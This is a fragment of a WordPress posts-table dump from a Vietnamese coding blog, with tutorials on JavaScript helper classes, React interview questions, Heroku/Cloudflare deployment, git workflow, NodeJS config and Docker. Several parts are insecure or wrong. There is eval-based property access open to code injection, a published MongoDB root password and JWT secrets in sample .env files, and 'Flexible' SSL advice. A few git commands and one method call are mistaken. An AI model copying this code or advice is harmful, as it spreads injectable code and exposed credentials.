{\r\n                result += cipherText[i]\r\n            } else {\r\n                result += this.charset[index]\r\n            }\r\n        }\r\n        return result\r\n    }\r\n}\r\n</pre>\r\n\r\n<h2>2. Date Time</h2>\r\n<pre>\r\nexport default class MyDatetime {\r\n    public static timeToText = (time: Date, pattern: string) => {\r\n        const rules = {\r\n            YYYY: `${time.getFullYear()}`,\r\n            YY: `${time.getFullYear()}`.slice(-2),\r\n            MM: `0${time.getMonth() + 1}`.slice(-2),\r\n            DD: `0${time.getDate()}`.slice(-2),\r\n            hh: `0${time.getHours()}`.slice(-2),\r\n            mm: `0${time.getMinutes()}`.slice(-2),\r\n            ss: `0${time.getSeconds()}`.slice(-2),\r\n        }\r\n\r\n        let text = pattern\r\n        Object.entries(rules).forEach(([key, value]) => {\r\n            text = text.replace(key, value)\r\n        })\r\n\r\n        return text\r\n    }\r\n\r\n    public static textToTime = (text: string, pattern: string) => {\r\n        const iFullYear = pattern.indexOf(\'YYYY\')\r\n        const iMonth = pattern.indexOf(\'MM\')\r\n        const iDay = pattern.indexOf(\'DD\')\r\n        const iHours = pattern.indexOf(\'hh\')\r\n        const iMinutes = pattern.indexOf(\'mm\')\r\n        const iSeconds = pattern.indexOf(\'ss\')\r\n        const iMs = pattern.indexOf(\'xxx\')\r\n\r\n        const year = iFullYear !== -1 ? Number(text.slice(iFullYear, iFullYear + 4)) : 0\r\n        const month = iMonth !== -1 ? Number(text.slice(iMonth, iMonth + 2)) : 0\r\n        const date = iDay !== -1 ? Number(text.slice(iDay, iDay + 2)) : 0\r\n        const hours = iHours !== -1 ? Number(text.slice(iHours, iHours + 2)) : 0\r\n        const minutes = iMinutes !== -1 ? Number(text.slice(iMinutes, iMinutes + 2)) : 0\r\n        const seconds = iSeconds !== -1 ? Number(text.slice(iSeconds, iSeconds + 2)) : 0\r\n        const milliseconds = iMs !== -1 ? Number(text.slice(iMs, iMs + 3)) : 0\r\n\r\n        const time = new Date()\r\n        time.setFullYear(year)\r\n        time.setMonth(month - 1)\r\n        time.setDate(date)\r\n        time.setHours(hours)\r\n        time.setMinutes(minutes)\r\n        time.setSeconds(seconds)\r\n        time.setMilliseconds(milliseconds)\r\n\r\n        return time\r\n    }\r\n}\r\n\r\n</pre>\r\n\r\n<h2>3. Khác</h2>\r\n<pre>\r\n\r\nclass MyObject {\r\n    static checkDirectExists(object, direct) {\r\n        let arr = direct.split(\".\");\r\n        let dir = \"object\";\r\n        for (let i = 0; i < arr.length; i++) {\r\n            dir = dir + \".\" + arr[i];\r\n            if (eval(\'!\' + dir)) {\r\n                return false;\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n    static searchValueExists(object, value) {\r\n        let find = false;\r\n        let searchObj = (object, value) => {\r\n            if (find) return;\r\n            if (Object.prototype.toString.call(object) == \"[object Object]\") {\r\n                for (let key in object) {\r\n                    searchObj(object[key], value)\r\n                }\r\n            }\r\n            else {\r\n                let val = object.toString().toUpperCase();\r\n                if (val.indexOf(value.toUpperCase()) > -1) {\r\n                    find = true;\r\n                }\r\n            }\r\n        }\r\n        searchObj(object, value);\r\n        return find;\r\n    }\r\n    static getValueByDirect(object, direct) {\r\n        if (typeof direct == \"string\") {\r\n            if (MyObject.checkDirectExists(object, direct)) {\r\n                return eval(\'object.\' + direct);\r\n            }\r\n        }\r\n        else if (typeof direct == \"function\") {\r\n            return direct(object);\r\n        }\r\n        return;\r\n    }\r\n    static setValueByDirect(object, direct, value) {\r\n        let strToArr = (str) => {\r\n            //quy định: [5]: array, [\"5\"]: object\r\n            let arr = str.split(/\\[|\\]|\\./);\r\n            let rs = arr.reduce((acc, item) => {\r\n                if (/^[0-9]+$/.test(item)) item = Number(item);\r\n                if (item !== \"\") acc.push(item);\r\n                return acc;\r\n            }, [])\r\n            return rs;\r\n        }\r\n        let addProps = (obj, arr, val) => {\r\n            if (arr.length > 1) {\r\n                if (typeof arr[1] == \'string\') {\r\n                    obj[arr[0]] = obj[arr[0]] || {};\r\n                }\r\n                if (typeof arr[1] == \'number\') {\r\n                    obj[arr[0]] = obj[arr[0]] || [];\r\n                }\r\n                let temp = obj[arr[0]];\r\n                arr.shift();\r\n                addProps(temp, arr, val);\r\n            }\r\n            else {\r\n                obj[arr[0]] = val;\r\n            }\r\n            return obj;\r\n        }\r\n        if (typeof direct == \'string\') direct = strToArr(direct);\r\n        if (Array.isArray(direct)) {\r\n            return addProps(object, direct, value);\r\n        }\r\n    }\r\n    static cleanUndefined(object) {\r\n        object = JSON.parse(JSON.stringify(object));\r\n        if (Array.isArray(object)) {\r\n            let array = object.reduce((acc, item) => {\r\n                if (item) {\r\n                    item = MyObject.cleanUndefined(item)\r\n                    acc.push(item);\r\n                }\r\n                return acc;\r\n            }, [])\r\n            return array;\r\n        }\r\n        if (Object.prototype.toString.call(object) == \"[object Object]\") {\r\n            for (let key in object) {\r\n                object[key] = MyObject.cleanUndefined(object[key])\r\n            }\r\n            return object;\r\n        }\r\n        else {\r\n            return object;\r\n        }\r\n    }\r\n}\r\nclass MyForm {\r\n    static getData(elm) {\r\n        let data = {},\r\n            ipString = elm.querySelectorAll(\'input[type=text],input[type=password],select\'),\r\n            ipNumber = elm.querySelectorAll(\'input[type=number]\'),\r\n            ipDate = elm.querySelectorAll(\'input[type=date]\');\r\n        ipString.forEach((item, index) => {\r\n            MyObject.setValueByDirect(data, item.name, item.value)\r\n        })\r\n        ipNumber.forEach((item, index) => {\r\n            MyObject.setValueByDirect(data, item.name, Number(item.value))\r\n        })\r\n        ipDate.forEach((item, index) => {\r\n            if (item.value == \"\") return;\r\n            let temp = (new Date(item.value)).getTime();\r\n            MyObject.setValueByDirect(data, item.name, temp)\r\n        })\r\n        data = MyObject.cleanUndefined(data);\r\n        return data;\r\n    }\r\n    static setData(object, elm) {\r\n        elm.reset();\r\n        let ipString = elm.querySelectorAll(\'input[type=text],input[type=password],select\'),\r\n            ipNumber = elm.querySelectorAll(\'input[type=number]\'),\r\n            ipDate = elm.querySelectorAll(\'input[type=date]\'),\r\n            ipRadio = elm.querySelectorAll(\'input[type=radio]\'),\r\n            ipCheckbox = elm.querySelectorAll(\'input[type=checkbox]\');\r\n\r\n        ipString.forEach((item, index) => {\r\n            if (item.name == \"\") return;\r\n            item.value = MyObject.getValueByDirect(object, item.name);\r\n        })\r\n        ipNumber.forEach((item, index) => {\r\n            if (item.name == \"\") return;\r\n            let temp = MyObject.getValueByDirect(object, item.name);\r\n            if (!temp) return;\r\n            if (item.getAttribute(\"data-money\") == \"vnd\") {\r\n                item.value = temp.toFixed(3)\r\n            }\r\n            else {\r\n                item.value = temp\r\n            }\r\n        })\r\n        ipDate.forEach((item, index) => {\r\n            if (item.name == \"\") return;\r\n            let temp = MyObject.getValueByDirect(object, item.name);\r\n            if (!temp) return;\r\n            item.value = MyDateTime.format(temp, \"YYYY-MM-DD\");\r\n        })\r\n        ipRadio.forEach((item, index) => {\r\n            if (item.name == \"\") return;\r\n            if (item.value == MyObject.getValueByDirect(object, item.name)) {\r\n                item.checked = true;\r\n            }\r\n        })\r\n        ipCheckbox.forEach((item, index) => {\r\n            if (item.name == \"\") return;\r\n            if (MyObject.getValueByDirect(object, item.name).includes(item.value)) {\r\n                item.checked = true;\r\n            }\r\n        })\r\n    }\r\n    static autoCompleteMoney(ipNumElement) {\r\n        ipNumElement.value = Number(ipNumElement.value).toFixed(3);\r\n    }\r\n}\r\nclass MyNodeList {\r\n    static groupByAttribute(nodelist, attr) {\r\n        return Object.values(nodelist).reduce((acc, value) => {\r\n            let key = value.getAttribute(\'data-id\');\r\n            (acc[key] = acc[key] || []).push(value);\r\n            return acc;\r\n        }, {})\r\n    }\r\n}\r\n</pre>', 'MyClass - Những Class hay nhất của duycode.com', '', 'publish', 'open', 'open', '', 'myclass-nhung-class-hay-nhat-cua-duycode-com', '', '', '2022-03-16 21:04:50', '2022-03-16 21:04:50', '', 0, 'https://duycode.com/?p=865', 0, 'post', '', 0),
(870, 1, '2021-07-28 11:47:55', '2021-07-28 04:47:55', '1. Phân biệt VueJS và ReactJS => reactJS sử dụng JSX để render ra view, còn VueJS thì dùng template\r\n2. Bạn nghe nói đến JSX chưa? JSX là cú pháp mở rộng cho Javascript để mô tả giao diện, sử dụng cú pháp XML.\r\nCác XML elements, attributes và children được chuyển đổi thành các đối số truyền vào React.createElement.\r\n3. Bạn có sử dụng Redux không, dùng middleware nào không? => Có dùng, dùng Redux-saga và Redux-thunk, dùng redux để quản lý state của nhiều component\r\n4. Mô tả mô hình redux => View call action -> action dispatch -> change state trong reducer -> cập nhật lại store -> render lại view\r\n5. Bạn làm như nào để quản lý hiệu năng? => tối ưu hiệu năng, bằng cách tránh re render không cần thiết, sử dụng useMemo, useCalback, lazyload, paging trong grid có nhiều bản ghi\r\n6. Bản sử dụng công cụ package management nào? => Dùng npm và Yarn\r\n7. NPM và Yarn khác gì nhau? Npm thì install các dependencies lần lượt, còn Yarrn thì install song song các dependencies\r\n8. Webpack là công cụ giúp đóng gói toàn bộ file js, css\r\n9. Cross browsing: đa trình duyệt, áp dụng trên nhiều trình duyệt như IE, chrome, firefox, safari, opera.\r\n10. để tránh việc bị lỗi các thư viện khi sử dụng trên IE phiên bản cũ thì có thể dùng webpack để biên dịch code phù hợp với nhiều trình duyệt\r\n- Chuyển đổi các mã nguồn : JSX, less, sass, scss thành js, ... ES6 -> ES5 thông qua babel transpiler\r\n11. Babel là 1 công cụ chuyển đổi các mã JS, ES thành các phiên bản cũ hơn (ví dụ từ ES6 -> ES5, SASS -> CSS)\r\n12. Bạn hay dùng react hook hay class component.\r\n13. Redux dùng để làm gì? có tác dụng gì?\r\n14. các cách để tăng performance phía front-end: dùng cache, lazy load (search thêm)\r\n15. khác nhau giữa các method xử lý mảng (foreach, map, filter, find, some)\r\n16. lifecycle của react?\r\n17. local storage, session storage, cookie khác nhau ntn?\r\n18. ES6 có gì mới? arrow function, let, var, spead syntax, Promise,..(tìm hiểu kĩ mấy cái đấy)', 'Những câu hỏi ReactJS', '', 'publish', 'open', 'open', '', 'nhung-cau-hoi-reactjs', '', '', '2022-08-16 00:01:49', '2022-08-16 00:01:49', '', 0, 'https://duycode.com/?p=870', 0, 'post', '', 0),
(873, 1, '2021-02-19 22:46:36', '2021-02-19 15:46:36', '<pre>\n.loading {\n                    width: 20px;\n                    height: 20px;\n                    margin: 0 auto;\n                    border-radius: 50%;\n                    border-top: 2px solid aqua;\n                    border-bottom: 2px solid blueviolet;\n                    border-left: 2px solid #03A9F4;\n                    border-right: 2px solid #FFEB3B;\n                    animation: rotate360 0.5s linear 0s infinite;\n}\n@keyframes rotate360 {\n                    from {transform: rotate(0deg);}\n                    to {transform: rotate(360deg);}\n}\n</pre>\n', 'CSS - Animation xoay tròn', '', 'publish', 'open', 'open', '', 'css-animation-xoay-tron', '', '', '2021-02-19 22:46:36', '2021-02-19 15:46:36', '', 0, 'https://duycode.com/?p=873', 0, 'post', '', 0),
(879, 1, '2021-05-04 00:00:35', '2021-05-03 17:00:35', '<h1>I. Đẩy từ Local lên Git</h1>\n- Tại file ./.gitignore\n<pre>\n.env\n.gitignore\nnode_modules\n</pre>\n- Tại file ./.env\n<pre>\nMONGODB_URI=mongodb+srv://root:abcD1234@cluster0-wuil3.mongodb.net/test?retryWrites=true\nMONGO_LOCALHOST=mongodb://localhost:27017/bstrang\nMONGODB_DB_NAME=bstrang\n</pre>\n- Tại file ./Procfile\n<pre>\nweb: node src/server.js\n</pre>\n- Tại file ./src/server.js , cần lưu ý cổng PORT\n<pre>\nif (!process.env.PORT) require(\'dotenv\').config();\nconst port = process.env.PORT || 3000;\n</pre>\n-- Đầy đủ các mục trên là có thể đẩy tạm thời lên git được rồi\n\n<h1>II. Deploy lên Heroku</h1>\n<h2>1. Cấu hình</h2>\n- Tại file ./src/server.js , cần lưu ý cổng PORT\n<pre>\nif (!process.env.PORT) require(\'dotenv\').config();\nconst port = process.env.PORT || 3000;\n</pre>\n- Tạo file \"Procfile\" (không có đuôi mở rộng) tại thư mục gốc: ./Procfile\n<pre>\nweb: node src/server.js\n</pre>\n\n<h2>2. Cách 1: Deploy lên Heroku bằng Heroku Git</h2>\n- Bước 1: Cài Heroku CLI\n- Bước 2: Dùng Command Prompt với quyền Administrator (từ lần thứ 2 trở đi, có thể dùng Terminal của VSCode)\n<blockquote>\nheroku login\n\ncd my-project/\ngit init\nheroku git:clone -a yourproject\n\ngit add .\ngit commit -am \"make it better\"\ngit push heroku master\n</blockquote>\n\n<h2>3. Cách 2: Deploy lên Heroku bằng Github</h2>\n- Trên trang heroku, phần Deploy -> Deployment method: chọn phương thức Github\n- Tích chọn: Automatic deploys from  master are enabled\n\n- Dùng trình duyệt vào website hưởng thành quả, VD: <a href=\"https://medihome-vn.herokuapp.com/manager\" rel=\"noopener\" target=\"_blank\">https://medihome-vn.herokuapp.com/manager</a>\n\n<h2>4. Tạo biến thay file .env</h2>\n-- Vào Setting -> Config Vars -> Thêm biến tương ứng cặp Key - Value\n<blockquote>\nKEY: MONGODB_URI\nVALUE: mongodb+srv://root:abcD1234@cluster0-wuil3.mongodb.net/test?retryWrites=true\n</blockquote>\n\n<h1>III. Trỏ tên miền từ Cloudflare về Heroku</h1>\n1. Trên Heroku -> Settings -> Add Domain\n-> Lấy DNS Target, trông dạng như sau:\n<blockquote>polished-spider-g32lzit2sw0tgd521lnn6pwl.herokudns.com</blockquote>\n\n2. Trên Cloudflare\n<table>\n<tr>\n<td>CNAME</td>\n<td>medihome.vn</td>\n<td>polished-spider-g32lzit2sw0tgd521lnn6pwl.herokudns.com</td>\n</tr>\n<tr>\n<td>CNAME</td>\n<td>www</td>\n<td>polished-spider-g32lzit2sw0tgd521lnn6pwl.herokudns.com</td>\n</tr>\n</table>\n\n-- Nhớ trỏ nameserver từ domain -> về cloudflare. Ví dụ:\n<table>\n<tr>\n<td>Nameserver 1</td>\n<td>ben.ns.cloudflare.com</td>\n</tr>\n<tr>\n<td>Nameserver 2</td>\n<td>may.ns.cloudflare.com</td>\n\n</tr>\n</table>\n\n3. Trên Cloudflare -> SSL/TLS\n- Chọn Flexible (nghĩa là dùng SSL từ Browser đến Cloudflare, còn từ Cloudflare đến Heroku thì ko có SSL)', 'NodeJS – 4. Deploy Github và Heroku, Trỏ Domain qua Cloudflare', '', 'publish', 'open', 'open', '', 'nodejs-4-1-deploy-heroku-va-connect-mongodb', '', '', '2021-05-04 00:00:35', '2021-05-03 17:00:35', '', 0, 'https://duycode.com/?p=879', 0, 'post', '', 0),
(883, 1, '2021-09-01 02:00:14', '2021-08-31 19:00:14', '- Khi là member trong 1 Project nhiều người\r\n- VD: Project chung: https://github.com/duyk30b/demo-project.git\r\n<img src=\"https://vinatex.com.vn/wp-content/uploads/2017/11/Git-Scm.png\" alt=\"\" />\r\n\r\n<h2>1. Pull source về Local</h2>\r\n<pre>\r\ngit init\r\ngit remote add origin https://github.com/duyk30b/demo-project.git\r\n\r\n//Trong github có thể có nhiều nhánh. VD: master, developer, feature\r\n//Trường hợp này, chỉ được lấy code từ nhánh \"developer\" về\r\ngit pull origin developer\r\n\r\ngit branch -a\r\n//Bây giờ ta sẽ thấy tất cả các nhánh\r\n//Chú ý:\r\n-- Các nhánh trên local màu xanh. Dấu * thể hiện đang làm việc ở nhánh nào ==>  Ví dụ: *developer\r\n-- Các nhánh trên remotes màu đỏ ==> Ví dụ: remotes/origin/developer\r\n-- Và để phân biệt nhánh \"developer\" trên remotes, và \"developer\" trên local. Git đã tự thêm:\r\n    + Chữ \"remotes\", và chữ \"origin\". Ví dụ: developer ==> remotes/origin/developer\r\n    + Khi làm việc với các nhánh trên remotes => thường làm việc với tên: \"origin/developer\"\r\n</pre>\r\n\r\n<h2>2. Tạo nhánh của mình</h2>\r\n-- Tại local, thường thì ko sửa trực tiếp trên nhánh \"developer\", nhánh này có nhiệm vụ pull code về để xem code mới\r\n-- Ta cần phải tạo ra một nhánh phụ mới, và sửa trên một nhánh phụ đó\r\n<pre>\r\n//Liệt kê các nhánh hiện tại --> Đương nhiên ban đầu local chỉ có nhánh: *developer\r\ngit branch -a\r\n\r\n//Tạo thêm nhánh mới: feature/yourname\r\ngit branch feature/yourname\r\ngit checkout feature/yourname\r\ngit branch\r\n//Đã tạo nhánh chuyển nhánh: developer và nhánh: *feature/yourname\r\n//Bolus: git checkout -b feature/yourname => Vừa tạo nhánh vừa chuyển sang nhánh mới làm việc\r\n\r\n//Khi muốn xóa nhánh \"feature/yourname\", phải quay về nhánh *developer rồi xóa\r\ngit checkout developer \r\ngit branch -d feature/yourname\r\n//Chỉ còn nhánh: *developer\r\n</pre>\r\n\r\n<h2>3. Lưu lại phiên làm việc bằng git stash</h2>\r\n-- Khi các file đang làm việc ở trạng thái modified hoặc ở staging\r\n==> không thể chuyển nhánh, merge, rebase ...\r\n==> cần commit các file đó, hoặc giải pháp đơn giản hơn là stash\r\n<pre>\r\n//Kiểm tra những stash đã lưu\r\ngit stash list \r\n\r\n//Lưu lại stash\r\ngit stash                        ---> Lưu đơn giản\r\ngit stash save                   ---> Giống git stash\r\ngit stash save \"message stash\"   ---> Lưu stash mới message\r\n\r\n//Sau khi commit hay quay về nhánh, hay làm gì gì đó đã xong, muốn lấy lại code trên stash về làm tiếp\r\ngit stash apply                  ---> apply stash gần nhất là stash@{0}\r\ngit stash apply stash@{1}        ---> apply stash theo id được chỉ định\r\n\r\n//Có thể Xóa các stash đã lưu:\r\ngit stash clear                 ---> xóa hết\r\ngit stash drop                  ---> xóa stash gần nhất\r\ngit stash drop stash@{1}        ---> xóa stash theo id được chỉ định\r\n\r\n//Có thể vừa apply stash, vừa xóa stash bằng prop\r\ngit stash pop                   ---> apply stash gần nhất là stash@{0} và xóa luôn stash@{0}\r\ngit stash apply stash@{1}       ---> apply stash và xóa luôn stash theo id được chỉ định\r\n</pre>\r\n\r\n<h2>4. Update code mới nhất tại remotes</h2>\r\n<h3>4.1. Fetch code mới nhất từ remote </h3>\r\n<pre>\r\n//Kiểm tra version các commit tại tất cả các nhánh, xem vị trí đứng của mỗi nhánh đang ở đâu\r\ngit log --all -10 --oneline --graph\r\n\r\n//Update thông tin mới nhất các nhánh trên remotes\r\ngit fetch\r\n//Lúc này, các nhánh trên remote đã có khá nhiều commit mới, cần kiểm tra lại\r\ngit log --oneline -10 remotes/origin/developer\r\n</pre>\r\n\r\n<h3>4.2. Update code tại nhánh developer (local)</h3>\r\n-- Có 2 cách update code mới, dùng merge hoặc dùng rebase\r\n-- Chọn cách rebase sẽ làm code clean hơn rất nhiều -> khuyên dùng\r\n-- Nhánh *developer là nhánh ko làm việc ==> update mà ko xảy ra conflict -> dùng rebase cho tiện\r\n<pre>\r\n//Chuyển sang nhánh *developer\r\ngit branch\r\ngit checkout developer\r\n\r\n//Cách 1. Dùng Rebase: \"Rebase\" code từ nhánh origin/developer vào developer(local). \r\ngit rebase origin/developer\r\n\r\n//Cách 2. Dùng merge: \"Merge\" code từ nhánh origin/developer vào developer(local)\r\n// Cách này sẽ tạo ra 1 commit mới, là commit: merge code từ origin/developer vào developer\r\ngit merge origin/developer\r\n\r\n//Cách 3. dùng Pull: Pull code ở nhánh developer(remotes) về, sau đó merge code vào nhánh hiện tại là developer(local)\r\ngit pull github developer\r\n\r\n//Kết quả: nhánh *developer đang ở trạng thái giống hệt trên remote: origin/developer\r\n</pre>\r\n\r\n<h2>5. Update code tại nhánh feature/yourname</h2>\r\n<h3>5.1. Chuyển về nhánh đang làm việc: feature/yourname </h3>\r\n<pre>\r\ngit branch\r\ngit checkout feature/yourname\r\n//Kiểm tra xem vị trí commit đang ở đâu\r\ngit log --oneline -10 feature/yourname\r\n</pre>\r\n\r\n<h3>5.2. Gộp tất cả các commit từ khi rẽ nhánh với remotes thành 1 commit duy nhất</h3>\r\n<pre>\r\n//Kiểm tra vị trí rẽ nhánh\r\ngit log --all -10 --oneline --graph\r\n//giả sử số lượng các commit muốn gộp là 3\r\ngit rebase -i HEAD~3 \r\n//Xuất hiện 2 file cần chỉnh sửa.\r\n//Edit_1: chọn các commit mới nhất để gộp ==> chuyển từ \"pick\" => \"squash\"\r\n//Edit_2: Sửa các message của commit\r\n</pre>\r\n\r\n\r\n<h3>5.3. Update code tại nhánh feature/yourname(local)</h3>\r\n-- Update code: Có thể dùng rebase hoặc merge tương tự như phần 4.2.\r\n-- Có thể update code từ nhánh \"developer\" hoặc nhánh \"origin/developer\" đều được\r\n-- Thường thì nhánh này mình hay làm việc, sẽ xảy ra conflict\r\n<pre>\r\n-- Khi dùng rebase, cần fix các conflict ==> Sau đó continue đến khi xong\r\ngit rebase origin/developer\r\ngit rebase --continue\r\n</pre>\r\n\r\n<h2>6. Push code lên Remotes</h2>\r\n-- Khi push code lên, mình chỉ được push lên nhánh chính mình quản lý: \"feature/yourname\"\r\n<pre>\r\ngit add .\r\ngit commit -m \"Company-[DEV]-TaskName\" -m \"create function ABC\"\r\ngit push --set-upstream github feature/yourname\r\n</pre>\r\n\r\n-- Khi làm việc nhóm, thường thì mỗi lần push request 1 commit mà thôi\r\n-- Như vậy, sau khi push commit lên rồi, cần update lại push cũ ==> dùng --amend\r\n<pre>\r\n//Gộp vào commit trước bằng lệnh: --amend\r\ngit add .\r\ngit commit --amend \"Company-[DEV]-TaskName\" -m \"update create function ABC\"\r\ngit push\r\n</pre>', 'Git cơ bản - 2. Quy trình làm việc nhóm', '', 'publish', 'open', 'open', '', 'git-co-ban-2-mot-so-lenh-hay-dung', '', '', '2022-08-12 06:27:29', '2022-08-12 06:27:29', '', 0, 'https://duycode.com/?p=883', 0, 'post', '', 0),
(893, 1, '2021-05-01 00:00:01', '2021-04-30 17:00:01', '<h1>I. Cài đặt Project</h1>\n<h2>1. Cài NodeJS và npm</h2>\n- Download và cài đặt: <a href=\"https://nodejs.org/en/download/\" rel=\"noopener\" target=\"_blank\">https://nodejs.org/en/download/</a>\n- Kiểm tra version bằng terminal của VSCode\n<blockquote>\nnode -v\nnpm -v\n</blockquote>\n<h2>2. Tạo Project</h2>\n- Tạo thư mục: VD: D:\\Projects\\medihome\n- Dùng VSCode mở thư mục project lên, và cài npm\n<blockquote>\nnpm init\n</blockquote>\n- Cài thư viện Express\n<blockquote>\nnpm install express\n</blockquote>\n\n<h1>II. Hello wold</h1>\n<h2>1. Tạo file ./src/server.js</h1>\n<pre>\nconst express = require(\'express\');\nconst app = express();\nconst port = process.env.PORT || 3000;\n\napp.get(\'/\', (req, res) => {\n  res.send(\'Hello World!\');\n})\napp.listen(port, () => {\n  console.log(`Example app listening at http://localhost:` + port);\n})\n</pre>\n<h2>2. Sửa file ./package.json</h2>\n<pre>\n  \"main\": \"src/server.js\",\n</pre>\n<h2>3. Khởi chạy</h2>\n- Dùng terminal:\n<blockquote>\nnode src/server.js\n</blockquote>\n- Dùng trình duyệt vào link: <a href=\"http://localhost:3000/\" rel=\"noopener\" target=\"_blank\">http://localhost:3000/</a>', 'NodeJS - 1. Cài đặt NodeJS ExpressJS', '', 'publish', 'open', 'open', '', 'nodejs-1-cai-dat-nodejs-expressjs', '', '', '2021-05-01 00:00:01', '2021-04-30 17:00:01', '', 0, 'https://duycode.com/?p=893', 0, 'post', '', 0),
(903, 1, '2021-05-03 00:00:58', '2021-05-02 17:00:58', '<h1>1. Cây thư mục mẫu của NodeJS</h1>\n<pre>.\n├── node_modules\n├── src\n│    ├── app\n│    │    ├── controllers\n│    │    │    ├── AdminController.js\n│    │    │    └── CourseController.js\n│    │    ├── middlewares\n│    │    │    └── SortMiddleware.js\n│    │    └── models\n│    │         └── Course.js\n│    ├── config\n│    │    └── database\n│    │    │    ├── mongoDB.js\n│    │    │    └── mongoose.js\n│    ├── public\n│    │    ├── css\n│    │    │    └── app.css\n│    │    ├── img\n│    │    │    └── logo.png\n│    │    └── vendor\n│    │         ├── open-iconic-master\n│    │         │    └── font\n│    │         │         └── css\n│    │         │              └── open-iconic-bootstrap.css\n│    │         └── fontawesome\n│    │               └── css\n│    ├── resources\n│    │    ├── fonts\n│    │    ├── images\n│    │    ├── scss\n│    │    │    ├── _variables.scss\n│    │    │    └── app.scss\n│    │    └── views\n│    │         ├── courses\n│    │         │     ├── courseHome.hbs\n│    │         │     ├── create.hbs\n│    │         │     └── showOne.hbs\n│    │         ├── layouts\n│    │         │     └── main.hbs\n│    │         ├── partials\n│    │         │     ├── header.hbs\n│    │         │     └── footer.hbs\n│    │         ├── home.hbs\n│    │         └── news.hbs\n│    ├── routes\n│    │    ├── admin\n│    │    │    └── index.js\n│    │    ├── courses\n│    │    └── index.js\n│    ├── util\n│    │    └── mongoose.js\n│    └── server.js\n├── .env\n├── .gitignore\n├── package-lock.json\n├── package.json\n└── Procfile\n</pre>\n\n<h1>II. Các file cấu hình</h1>\n<h2>1. File .env (không có tên file)</h2>\n- File này chỉ cấu hình trên máy\n<pre>\nMONGODB_URI=mongodb+srv://root:abcD1234@cluster0-wuil3.mongodb.net/test?retryWrites=true\nMONGO_LOCALHOST=mongodb://localhost:27017/medihome\nMONGODB_DB_NAME=medihome\n\nSECRET_SIGNEDCOOKIES=@123%456\nSECRET_JWT=$DWDw123\n</pre>\n\n<h2>2. File Procfile (không có tên mở rộng)</h2>\n- File này cấu hình chạy trên server, giả sử heroku\n- Khi không có file này, heroku tự chạy lệnh: \"npm start\"\n<pre>\nweb: node src/server.js\n</pre>\n\n<h2>3. File .gitignore (không có tên file)</h2>\n<pre>\n.gitignore\n.env\nnode_modules\n</pre>', 'NodeJS - 3. Cây thư mục mẫu và các file cấu hình', '', 'publish', 'open', 'open', '', 'nodejs-3-cay-thu-muc-mau-va-cac-file-cau-hinh', '', '', '2021-05-03 00:00:58', '2021-05-02 17:00:58', '', 0, 'https://duycode.com/?p=903', 0, 'post', '', 0),
(957, 1, '2021-03-09 17:53:04', '2021-03-09 10:53:04', '<h2>1. Cài đặt trên linux</h2>\r\n<note>sudo apt install mongodb-clients</note>\r\n\r\n<h2>2. Connect</h2>\r\n<pre>\r\nshow dbs -> show các database\r\nuse mydata -> truy vấn vào database: mydata ,\r\nshow collections -> show các collection trong database đang truy vấn\r\ndb.books.find() -> tìm các document trong collection books\r\n</pre>\r\n2. Cài đặt trên windows\r\n<details>\r\n<summary>Cũ :((</summary>\r\nTrang chủ: <a href=\"https://www.mongodb.com/\" rel=\"noopener\" target=\"_blank\">https://www.mongodb.com/</a>\r\n\r\n1. Installer\r\n-- Tìm tại Docs, cài đặt: MongoDB Community Edition\r\n-- Sau khi cài đặt xong, thư mục cài đặt mặc định là: C:\\Program Files\\MongoDB\\Server\\4.4\\bin\r\n\r\n2. Bật CMD để chạy mongod\r\n-- cd về thư mục mongod:\r\n<blockquote> cd C:\\Program Files\\MongoDB\\Server\\4.4\\bin</blockquote>\r\n-- Chạy câu lệnh đầu tiên: \r\n<blockquote>mongod</blockquote>\r\n-- Sẽ xuất hiện lỗi thiếu thư mục: C:\\data\\db  -> Tạo thêm thư mục C:\\data\\db\r\n-- Chạy lại câu lệnh mongod\r\n\r\n2. Bật tiếp CMD thứ 2 lên test\r\n-- Vẫn CD về thư mục mongoDB: C:\\Program Files\\MongoDB\\Server\\4.4\\bin\r\n-- Gõ lệnh: \r\n<blockquote>mongo</blockquote>\r\n-- Sau khi xuất hiện version của MongoShell là đã thành công.\r\n-- Tiếp tục show các database ra thì gõ tiếp\r\n<blockquote>show dbs</blockquote>\r\n\r\n3. Hiểu đơn giản:\r\n-- Mỗi lần muốn chạy mongoDB, thì phải start 2 thứ trong thư mục: C:\\Program Files\\MongoDB\\Server\\4.4\\bin\r\n-- Đầu tiên, chạy file: mongod.exe\r\n-- Sau đó, chạy tiếp file: mongo.exe\r\n-- Các câu lệnh cần xử lý với databasse sẽ xử lý với CMD bật lên bởi mongo.exe\r\n\r\n4. Muốn chạy mongoDB mà ko cần trỏ vào thư mục gốc của mongoDB\r\n-- This Computer -> Properties -> Remote setting -> Advanced -> Environment Variables\r\n-- Double click vào link \"Path\"\r\n-- Thêm link: C:\\Program Files\\MongoDB\\Server\\4.4\\bin\r\n-- Xong\r\n \r\n</details>\r\n\r\n\r\n\r\n\r\n\r\n\r\n', 'MongoDB - 1. Cài đặt trên Window', '', 'publish', 'open', 'open', '', 'mongodb-1-cai-dat-tren-window', '', '', '2022-08-12 03:17:23', '2022-08-12 03:17:23', '', 0, 'https://duycode.com/?p=957', 0, 'post', '', 0),
(962, 1, '2023-06-01 03:00:19', '2023-06-01 03:00:19', '<pre>\r\nversion: \'3.3\'\r\n\r\nnetworks:\r\n  mh_network:\r\n    driver: bridge\r\n\r\nservices:\r\n  nginx:\r\n    container_name: mhc_nginx\r\n    image: nginx:1.23.3-alpine\r\n    restart: unless-stopped\r\n    networks:\r\n      - mh_network\r\n    volumes:\r\n      - ./nginx/conf.d/:/etc/nginx/conf.d/\r\n      - ./nginx/other-domain.d/:/etc/nginx/other-domain.d/\r\n      - ./nginx/ssl/:/etc/nginx/ssl/\r\n    ports:\r\n      - \"80:80\"\r\n      - \"443:443\"\r\n      - \"23080:23080\"\r\n\r\n</pre>', 'docker-compose: Nginx', '', 'publish', 'open', 'open', '', 'docker-compose-nginx', '', '', '2023-07-06 03:52:51', '2023-07-06 03:52:51', '', 0, 'https://duycode.com/?p=962', 0, 'post', '', 0),
